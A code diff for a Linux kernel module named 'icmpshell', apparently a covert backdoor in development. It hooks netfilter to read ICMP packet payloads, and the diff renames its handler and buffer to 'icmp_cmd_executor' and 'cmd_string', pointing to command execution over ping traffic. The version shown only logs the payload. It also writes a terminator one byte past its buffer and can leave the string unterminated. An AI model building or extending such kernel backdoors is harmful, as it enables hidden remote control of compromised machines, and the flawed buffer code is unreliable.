@@ -6,7 +6,7 @@
 #define MAX_CMD_LEN 2040
 
 static struct nf_hook_ops nfho;
-static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
+static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
   struct iphdr *iph;
   struct icmphdr *icmph;
@@ -15,7 +15,7 @@ static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_
   unsigned char *tail;
   unsigned char *i;
   int j = 0;
-  char skb_string[MAX_CMD_LEN];
+  char cmd_string[MAX_CMD_LEN];
 
   iph = ip_hdr(skb);
   icmph = icmp_hdr(skb);
@@ -34,7 +34,7 @@ static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_
   for (i = user_data; i != tail; ++i) {
     char c = *(char *)i;
 
-    skb_string[j] = c;
+    cmd_string[j] = c;
 
     j++;
 
@@ -42,7 +42,7 @@ static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_
       break;
 
     if (j == MAX_CMD_LEN) {
-      skb_string[j] = '\0';
+      cmd_string[j] = '\0';
       break;
     }
 
@@ -52,7 +52,7 @@ static unsigned int icmp_check(void *priv, struct sk_buff *skb, const struct nf_
          "icmpshell: type=%d; code=%d; data=%s",
          icmph->type,
          icmph->code,
-         skb_string);
+         cmd_string);
   return NF_ACCEPT;
 }
 
@@ -60,7 +60,7 @@ static int __init startup(void)
 {
   printk(KERN_INFO "Loading icmpshell module\n");
 
-  nfho.hook = icmp_check;
+  nfho.hook = icmp_cmd_executor;
   nfho.hooknum = NF_INET_PRE_ROUTING;
   nfho.pf = PF_INET;
   nfho.priority = NF_IP_PRI_FILTER;
